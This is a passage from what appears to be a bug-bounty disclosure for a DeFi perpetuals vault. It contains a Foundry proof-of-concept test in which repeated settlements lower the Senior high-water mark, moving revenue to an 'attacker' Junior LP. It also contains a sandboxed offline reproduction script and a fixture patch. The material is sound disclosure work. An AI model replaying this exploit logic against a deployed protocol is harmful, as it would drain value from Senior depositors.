        assertGt(refundShares, 0, "initial Junior LP request is refundable");
        vm.prank(JUNIOR_LP);
        uint256 beforeGas = gasleft();
        juniorVault.claimRedeemRefund(initialJuniorRedeemId, JUNIOR_LP, JUNIOR_LP);
        attackerGasEstimate += beforeGas - gasleft();
        uint256 held = juniorVault.balanceOf(JUNIOR_LP);
        emit log_named_string("JUNIOR_LP_REALIZE_BRANCH", tag);
        emit log_named_uint("JUNIOR_LP_REFUND_CLAIMED_SHARES", refundShares);
        emit log_named_uint("JUNIOR_LP_RECLAIMED_WALLET_SHARES", held);
        emit log_named_decimal_uint("JUNIOR_LP_RECLAIMED_SHARE_VALUE", juniorVault.convertToAssets(held), 6);
        vm.warp(vm.getBlockTimestamp() + 3601);
        vm.prank(JUNIOR_LP);
        beforeGas = gasleft();
        uint256 id = juniorVault.requestRedeem(held, JUNIOR_LP, JUNIOR_LP);
        attackerGasEstimate += beforeGas - gasleft();
        if (vm.getBlockTimestamp() < pool.lpEpochStart(id)) vm.warp(pool.lpEpochStart(id));
        bytes[] memory tick = _mockPythUpdateData(price);
        vm.prank(KEEPER);
        beforeGas = gasleft();
        router.settleLpEpoch(tick);
        attackerGasEstimate += beforeGas - gasleft();
        beforeGas = gasleft();
        paid = _claim(juniorVault, JUNIOR_LP);
        attackerGasEstimate += beforeGas - gasleft();
        emit log_named_decimal_uint("JUNIOR_LP_PUBLIC_REDEEM_PAID", paid, 6);
        emit log_named_uint("JUNIOR_LP_PUBLIC_REDEEM_PENDING", juniorVault.pendingRedeemRequest(id, JUNIOR_LP));
        emit log_named_decimal_uint("JUNIOR_LP_PUBLIC_REDEEM_PENDING_VALUE", juniorVault.convertToAssets(juniorVault.pendingRedeemRequest(id, JUNIOR_LP)), 6);
        emit log_named_uint("JUNIOR_LP_PUBLIC_REDEEM_REFUNDABLE", juniorVault.refundableRedeemRequest(id, JUNIOR_LP));
        emit log_named_decimal_uint("JUNIOR_LP_PUBLIC_REDEEM_REFUNDABLE_VALUE", juniorVault.convertToAssets(juniorVault.refundableRedeemRequest(id, JUNIOR_LP)), 6);
        emit log_named_decimal_uint("JUNIOR_LP_WALLET_USDG_AFTER_REDEEM", settlementToken.balanceOf(JUNIOR_LP), 6);
        if (juniorVault.pendingRedeemRequest(id, JUNIOR_LP) > 0) {
            vm.warp(vm.getBlockTimestamp() + 3601);
            bytes[] memory retryTick = _mockPythUpdateData(price);
            vm.prank(KEEPER);
            beforeGas = gasleft();
            (bool retryOk,) = address(router).call(abi.encodeWithSignature("settleLpEpoch(bytes[])", retryTick));
            attackerGasEstimate += beforeGas - gasleft();
            emit log_named_uint("JUNIOR_LP_SECOND_SETTLE_OK", retryOk ? 1 : 0);
            if (retryOk) {
                beforeGas = gasleft();
                uint256 secondPaid = _claim(juniorVault, JUNIOR_LP);
                attackerGasEstimate += beforeGas - gasleft();
                paid += secondPaid;
                emit log_named_decimal_uint("JUNIOR_LP_SECOND_PAID", secondPaid, 6);
            }
        } else {
            vm.warp(vm.getBlockTimestamp() + 3601);
        }
        emit log_named_uint("JUNIOR_LP_FINAL_PENDING_SHARES", juniorVault.pendingRedeemRequest(id, JUNIOR_LP));
        emit log_named_decimal_uint("JUNIOR_LP_FINAL_PENDING_VALUE", juniorVault.convertToAssets(juniorVault.pendingRedeemRequest(id, JUNIOR_LP)), 6);
        emit log_named_uint("JUNIOR_LP_FINAL_REFUNDABLE_SHARES", juniorVault.refundableRedeemRequest(id, JUNIOR_LP));
        emit log_named_decimal_uint("JUNIOR_LP_WALLET_USDG_FINAL", settlementToken.balanceOf(JUNIOR_LP), 6);
        _logJuniorWealth(tag);
    }

    function _logTerminalRights(string memory tag, TerminalRights memory r) private {
        emit log_named_string("TERMINAL_RIGHTS_BRANCH", tag);
        emit log_named_uint("SENIOR_WALLET_SHARES", r.seniorWalletShares);
        emit log_named_uint("SENIOR_PENDING_SHARES", r.seniorPendingShares);
        emit log_named_uint("SENIOR_CLAIMABLE_SHARES", r.seniorClaimableShares);
        emit log_named_uint("SENIOR_CLAIMABLE_ASSETS", r.seniorClaimableAssets);
        emit log_named_uint("SENIOR_REFUNDABLE_SHARES", r.seniorRefundableShares);
        emit log_named_uint("JUNIOR_WALLET_SHARES", r.juniorWalletShares);
        emit log_named_uint("JUNIOR_PENDING_SHARES", r.juniorPendingShares);
        emit log_named_uint("JUNIOR_CLAIMABLE_SHARES", r.juniorClaimableShares);
        emit log_named_uint("JUNIOR_CLAIMABLE_ASSETS", r.juniorClaimableAssets);
        emit log_named_uint("JUNIOR_REFUNDABLE_SHARES", r.juniorRefundableShares);
        emit log_named_uint("JUNIOR_REFUNDABLE_CURRENT_ASSETS", r.juniorRefundableCurrentAssets);
    }

    function test_Med12SixFeedABAndHolderTrigger() public {
        _runAB(LOW, 190_000_000, 4, 30_000e6, 3_000e18);
    }

    function _runAB(uint256 revenueOpen, uint256 revenueClose, uint256 revenueRounds, uint256 revenueFunding,
        uint256 revenueSize) private
    {
        uint256 recap = _reachRecoveryState();
        _log("STATE after the first settlement");
        assertEq(pool.seniorHighWaterMark(), recap, "first settlement records the full recap intent as Senior HWM");
        assertGt(pool.pendingRecapitalizationAssets(), pool.seniorPrincipal(),
            "remaining recap intent exceeds first distributable principal");
        assertEq(seniorVault.totalSupply(), 2e12, "Senior supply");
        assertEq(seniorVault.balanceOf(SENIOR_LP), 1e12, "Senior LP owns half of the Senior supply");
        assertGt(juniorVault.balanceOf(JUNIOR_HOLDER), 1, "Junior holder kept funded shares");
        uint256 base = vm.getBlockTimestamp() + 3601;
        uint256 afterFirst = vm.snapshotState();

        // A: more permissionless settlements with no new cash, then ordinary trading revenue.
        _rounds(true, base);
        _log("STATE A after repeated settlements (no new cash, no Senior share burned)");
        uint256 hwmRatcheted = pool.seniorHighWaterMark();
        uint256 aCashBeforeRevenue = pool.totalAssets();
        uint256 aMarkBeforeRevenue = engine.lastMarkPrice();
        uint256 aTimeBeforeRevenue = vm.getBlockTimestamp();
        uint256 aSeniorSupply = seniorVault.totalSupply();
        uint256 aJuniorSupply = juniorVault.totalSupply();
        assertEq(seniorVault.totalSupply(), 2e12, "no Senior share was burned");
        _tradingRevenue(revenueOpen, revenueClose, revenueRounds, revenueFunding, revenueSize);
        uint256 aRevenueCash = pool.totalAssets() - aCashBeforeRevenue;
        (uint256 aSenior, uint256 aJunior) = _redeemAll(revenueClose, "STATE A after redemption settlement");
        TerminalRights memory aRights = lastTerminalRights;
        uint256 aJuniorLpPaid = _realizeJuniorLp(revenueClose, "A Junior LP public realization");
        uint256 aAttackerGas = attackerGasEstimate;
        uint256 aTime = vm.getBlockTimestamp();

        // B: control. Same timestamps, same marks, same revenue; no intermediate settlement.
        assertTrue(vm.revertToState(afterFirst));
        _rounds(false, base);
        _log("STATE B before revenue (control)");
        uint256 hwmControl = pool.seniorHighWaterMark();
        assertEq(pool.totalAssets(), aCashBeforeRevenue, "A/B cash before revenue");
        assertEq(engine.lastMarkPrice(), aMarkBeforeRevenue, "A/B mark before revenue");
        assertEq(vm.getBlockTimestamp(), aTimeBeforeRevenue, "A/B time before revenue");
        assertEq(seniorVault.totalSupply(), aSeniorSupply, "A/B Senior supply");
        assertEq(juniorVault.totalSupply(), aJuniorSupply, "A/B Junior supply");
        _tradingRevenue(revenueOpen, revenueClose, revenueRounds, revenueFunding, revenueSize);
        uint256 bRevenueCash = pool.totalAssets() - aCashBeforeRevenue;
        assertEq(bRevenueCash, aRevenueCash, "A/B identical trading cash inflow");
        (uint256 bSenior, uint256 bJunior) = _redeemAll(revenueClose, "STATE B (control) after redemption settlement");
        TerminalRights memory bRights = lastTerminalRights;
        uint256 bJuniorLpPaid = _realizeJuniorLp(revenueClose, "B Junior LP public realization");
        uint256 bAttackerGas = attackerGasEstimate;
        if (vm.getBlockTimestamp() < aTime) vm.warp(aTime);
        assertEq(vm.getBlockTimestamp(), aTime, "A and B end at the same time");

        emit log_string("SUMMARY (USDG)");
        emit log_named_decimal_uint("owner recapitalization P", recap, 6);
        emit log_named_decimal_uint("Senior HWM, control", hwmControl, 6);
        emit log_named_decimal_uint("Senior HWM, after repeated settlements", hwmRatcheted, 6);
        emit log_named_decimal_uint("revenue case: Senior LP received, control", bSenior, 6);
        emit log_named_decimal_uint("revenue case: Senior LP received, after settlements", aSenior, 6);
        emit log_named_decimal_uint("revenue case: Junior holder received, control", bJunior, 6);
        emit log_named_decimal_uint("revenue case: Junior holder received, after settlements", aJunior, 6);
        emit log_named_decimal_uint("attacker Junior LP received, control", bJuniorLpPaid, 6);
        emit log_named_decimal_uint("attacker Junior LP received, after settlements", aJuniorLpPaid, 6);
        emit log_named_decimal_uint("attacker two Junior wallets incremental gross", aJunior + aJuniorLpPaid - bJunior - bJuniorLpPaid, 6);
        emit log_named_uint("attacker A gas estimate", aAttackerGas);
        emit log_named_uint("attacker B gas estimate", bAttackerGas);
        emit log_named_uint("attacker A minus B gas estimate", aAttackerGas - bAttackerGas);
        assertGt(aJuniorLpPaid, bJuniorLpPaid, "Junior LP realizes more via public redemption");
        assertEq(hwmControl, recap, "control keeps the full-intent HWM");
        assertLt(hwmRatcheted, hwmControl, "repeated settlements lowered the Senior HWM");
        assertGt(bSenior, aSenior, "Senior LP receives less of the same later revenue");
        assertGt(aJunior, bJunior, "Junior holder receives more than in control");
        assertEq(aRights.seniorWalletShares + aRights.seniorPendingShares + aRights.seniorClaimableShares
            + aRights.seniorRefundableShares, 0, "A Senior has no deferred share right");
        assertEq(bRights.seniorWalletShares + bRights.seniorPendingShares + bRights.seniorClaimableShares
            + bRights.seniorRefundableShares, 0, "B Senior has no deferred share right");
        assertEq(aRights.seniorClaimableAssets + bRights.seniorClaimableAssets, 0,
            "neither Senior payout is delayed in the vault");
        assertEq(bRights.juniorRefundableCurrentAssets, 0,
            "control Junior refund shares have zero current redemption value");
    }

    function test_Med12SixFeedTraderClaimBeforeRatchet() public {
        _reachRecoveryState();
        uint256 claim = engine.traderClaimBalanceAssets(TRADER_2);
        uint256 cashBefore = pool.totalAssets();
        uint256 hwmBefore = pool.seniorHighWaterMark();
        assertGt(claim, 0, "external trader has an unpaid claim");
        vm.prank(TRADER_2);
        engine.settleTraderClaim(TRADER_2);
        assertEq(engine.traderClaimBalanceAssets(TRADER_2), 0, "ordinary trader claim settled");
        assertEq(cashBefore - pool.totalAssets(), claim, "claim cash left pool");
        emit log_named_decimal_uint("CLAIM_CONTROL_PAID", claim, 6);
        _log("STATE after ordinary trader claim");
        _rounds(true, vm.getBlockTimestamp() + 3601);
        assertLt(pool.seniorHighWaterMark(), hwmBefore,
            "ordinary trader claim does not prevent HWM ratchet");
    }

    function test_Med12SixFeedNoOwnerConfigBootstrap() public {
        uint256 recap = _reachRecoveryState();
        assertEq(pool.seniorHighWaterMark(), recap, "public checkpoint reached recap bootstrap");
        assertGt(pool.pendingRecapitalizationAssets(), pool.seniorPrincipal(),
            "public checkpoint leaves pending recap for the ratchet");
        _log("STATE public bootstrap without owner config change");
    }
}
```

### Appendix B — `run_poc_isolated.sh`

```bash
#!/usr/bin/env bash
set -euo pipefail

# Reproduce the MED-12 incomplete-fix variant from the pinned public source.
# Required tools: bash, python3, bwrap, forge 1.5.1, solc 0.8.35.
# No private keys, .env, RPC, or public-chain writes are used.
packet_dir="$(cd -- "$(dirname -- "${BASH_SOURCE[0]}")" && pwd -P)"
project_dir="$(pwd -P)"
source_root="${MED12_SOURCE_ROOT:-$project_dir/campaigns/plether-immunefi-20261103/source}"
source_root="$(realpath "$source_root")"
deps_root="${MED12_DEPS_ROOT:-$source_root/lib}"
deps_root="$(realpath "$deps_root")"
forge_bin="${MED12_FORGE_BIN:-$(command -v forge || true)}"
solc_bin="${MED12_SOLC_BIN:-$(command -v solc || true)}"
bwrap_bin="${MED12_BWRAP_BIN:-$(command -v bwrap || true)}"
run_name="${MED12_RUN_NAME:-run01}"

for required in "$source_root/packages/perps/src/HousePool.sol" \
    "$source_root/packages/perps/test/perps/BasePerpTest.sol" \
    "$deps_root/forge-std/src" "$deps_root/openzeppelin-contracts/contracts" \
    "$deps_root/morpho-blue/src" "$packet_dir/SeniorHwmSixFeed.t.sol" \
    "$packet_dir/patch_sixfeed_fixture.py"; do
  if [[ ! -e "$required" ]]; then
    printf 'Missing required path: %s\n' "$required" >&2
    exit 2
  fi
done
for binary in "$forge_bin" "$solc_bin" "$bwrap_bin"; do
  if [[ ! -f "$binary" ]]; then
    printf 'Set MED12_FORGE_BIN, MED12_SOLC_BIN, and MED12_BWRAP_BIN to installed binaries. Missing: %s\n' "$binary" >&2
    exit 2
  fi
done
if find "$source_root" -type f -name '.env' -print -quit | grep -q .; then
  printf 'Remove real .env files from the public source clone before isolated reproduction.\n' >&2
  exit 2
fi

mkdir -p "$packet_dir/evidence"
out="$packet_dir/evidence/$run_name"
mkdir "$out" # a new name preserves every previous run
scratch="$(mktemp -d /tmp/plether-med12-submission-XXXXXXXX)"
cleanup() {
  local resolved
  resolved="$(realpath "$scratch")"
  case "$resolved" in
    /tmp/plether-med12-submission-*) rm -rf -- "$resolved" ;;
    *) return 1 ;;
  esac
}
trap cleanup EXIT

cp -a "$source_root/." "$scratch/workspace/"
mkdir -p "$scratch/workspace/lib/forge-std" \
    "$scratch/workspace/lib/openzeppelin-contracts" \
    "$scratch/workspace/lib/morpho-blue"
test_dir="$scratch/workspace/packages/perps/test/perps"
cp "$packet_dir/SeniorHwmSixFeed.t.sol" "$test_dir/spec/trader/SeniorHwmSixFeed.t.sol"
python3 "$packet_dir/patch_sixfeed_fixture.py" "$test_dir/BasePerpTest.sol"
python3 - "$test_dir/BasePerpTest.sol" "$test_dir" <<'PY'
from pathlib import Path
import sys

target = Path(sys.argv[1])
body = target.read_text()
for old, new in [
    ("LegacyOrderRouterHarness router;", "OrderRouter router;"),
    ("returns (LegacyOrderRouterHarness deployedRouter)", "returns (OrderRouter deployedRouter)"),
    ("new LegacyOrderRouterHarness(", "new OrderRouter("),
]:
    assert body.count(old) == 1, old
    body = body.replace(old, new)
target.write_text(body)
keep = {"BasePerpTest.sol", "SeniorHwmSixFeed.t.sol"}
for path in Path(sys.argv[2]).rglob("*.sol"):
    if path.name not in keep:
        path.unlink()
PY

sha256sum \
  "$source_root/packages/perps/src/HousePool.sol" \
  "$source_root/packages/perps/src/libraries/HousePoolPendingPreviewLib.sol" \
  "$source_root/packages/perps/src/libraries/HousePoolReconcilePlanLib.sol" \
  "$source_root/packages/perps/src/OrderRouter.sol" \
  "$packet_dir/SeniorHwmSixFeed.t.sol" \
  "$packet_dir/patch_sixfeed_fixture.py" \
  "$packet_dir/run_poc_isolated.sh" \
  "$test_dir/BasePerpTest.sol" \
  "$forge_bin" "$solc_bin" "$bwrap_bin" > "$out/hashes.txt"
printf 'source_commit=a82d4fefb02768e5b3bddcc97dee371eee24fea8\nrouter=production\nfeeds=6_synthetic_unsigned\nnetwork=unshared\n' > "$out/metadata.txt"

set +e
timeout 900s "$bwrap_bin" --die-with-parent --unshare-user --unshare-pid --unshare-net \
  --ro-bind /usr /usr --ro-bind /lib /lib --ro-bind /lib64 /lib64 \
  --proc /proc --dev /dev --tmpfs /tmp --dir /opt --dir /opt/tools \
  --ro-bind "$forge_bin" /opt/tools/forge \
  --ro-bind "$solc_bin" /opt/tools/solc \
  --bind "$scratch/workspace" /workspace \
  --ro-bind "$deps_root/forge-std" /workspace/lib/forge-std \
  --ro-bind "$deps_root/openzeppelin-contracts" /workspace/lib/openzeppelin-contracts \
  --ro-bind "$deps_root/morpho-blue" /workspace/lib/morpho-blue \
  --chdir /workspace --clearenv --setenv HOME /tmp --setenv PATH /opt/tools:/usr/bin \
  --setenv FOUNDRY_PROFILE default --setenv RAYON_NUM_THREADS 1 \
  /opt/tools/forge test --root packages/perps \
    --match-path test/perps/spec/trader/SeniorHwmSixFeed.t.sol \
    --match-test test_Med12SixFeed --offline --use /opt/tools/solc --threads 1 -vv \
  > "$out/stdout" 2> "$out/stderr"
status=$?
set -e
printf '%s\n' "$status" > "$out/exit"
sha256sum "$out/stdout" "$out/stderr" "$out/exit" >> "$out/hashes.txt"
printf 'MED-12 reproduction exit=%s; evidence=%s\n' "$status" "$out"
exit "$status"
```

### Appendix C — `patch_sixfeed_fixture.py`

```python
"""Patch only the copied BasePerpTest in the isolated scratch workspace."""
from pathlib import Path
import sys

path = Path(sys.argv[1])
body = path.read_text()
old_seed = "baseMockPyth.setAllPrices(baseFeedIds, int64(100_000_000), int32(-8), SETUP_TIMESTAMP);"
assert body.count(old_seed) == 1
body = body.replace(old_seed, "_seedSixPrices(1e8, SETUP_TIMESTAMP);")
start = body.index("    function _basePythFeedIds()")
end = body.index("    function _mockHistoricalPublishTime()", start)
replacement = '''    function _basePythFeedIds() internal pure returns (bytes32[] memory ids) {
        ids = new bytes32[](6);
        ids[0] = 0xa995d00bb36a63cef7fd2c287dc105fc8f3d93779f062f09551b0af3e81ec30b;
        ids[1] = 0xef2c98c804ba503c6a707e38be4dfbb16683775f195b091252bf24693042fd52;
        ids[2] = 0x84c2dde9633d93d1bcad84e7dc41c9d56578b7ec52fabedc1f335d673df0a7c1;
        ids[3] = 0x3112b03a41c910ed446852aacf67118cb1bec67b2cd0b9a214c58cc0eaa2ecca;
        ids[4] = 0x8ccb376aa871517e807358d4e3cf0bc7fe4950474dbe6c9ffc21ef64e43fc676;
        ids[5] = 0x0b1e3297e69f162877b577b0d6a47a0d63b2392bc8499e6540da4187a63e28f8;
    }

    function _basePythWeights() internal pure returns (uint256[] memory weights) {
        weights = new uint256[](6);
        weights[0] = 576e15; weights[1] = 136e15; weights[2] = 119e15;
        weights[3] = 91e15; weights[4] = 42e15; weights[5] = 36e15;
    }

    function _basePythBasePrices() internal pure returns (uint256[] memory prices) {
        prices = new uint256[](6);
        prices[0] = 117_500_000; prices[1] = 638_000; prices[2] = 134_480_000;
        prices[3] = 72_880_000; prices[4] = 10_860_000; prices[5] = 126_100_000;
    }

    function _basePythInversions() internal pure returns (bool[] memory inversions) {
        inversions = new bool[](6);
        inversions[1] = true; inversions[3] = true; inversions[4] = true; inversions[5] = true;
    }

    function _sixRawAt(uint256 basketPrice, uint256 i) internal pure returns (int64) {
        uint256[] memory bases = _basePythBasePrices();
        bool[] memory inverted = _basePythInversions();
        uint256 componentUsd = bases[i] * basketPrice / 1e8;
        uint256 raw = inverted[i] ? (1e16 + componentUsd / 2) / componentUsd : componentUsd;
        return SafeCast.toInt64(SafeCast.toInt256(raw));
    }

    function _seedSixPrices(uint256 basketPrice, uint256 time) internal {
        bytes32[] memory ids = _basePythFeedIds();
        for (uint256 i; i < 6; ++i) baseMockPyth.setPrice(ids[i], _sixRawAt(basketPrice, i), int32(-8), time);
    }

    function _mockPythUpdateData() internal returns (bytes[] memory updates) {
        return _mockPythUpdateData(1e8);
    }

    function _mockPythUpdateData(uint256 basketPrice) internal returns (bytes[] memory updates) {
        vm.roll(vm.getBlockNumber() + 1);
        vm.warp(vm.getBlockTimestamp() + 1);
        uint256 publishTime = vm.getBlockTimestamp();
        bytes32[] memory ids = _basePythFeedIds();
        MockPyth.FeedUpdate[] memory feeds = new MockPyth.FeedUpdate[](6);
        for (uint256 i; i < 6; ++i) {
            feeds[i] = MockPyth.FeedUpdate({id: ids[i], price: MockPyth.MockPrice({
                price: _sixRawAt(basketPrice, i), conf: 0, expo: -8,
                publishTime: publishTime, prevPublishTime: 0
            })});
        }
        updates = new bytes[](1);
        updates[0] = abi.encode(feeds);
    }

'''
body = body[:start] + replacement + body[end:]
path.write_text(body)
```
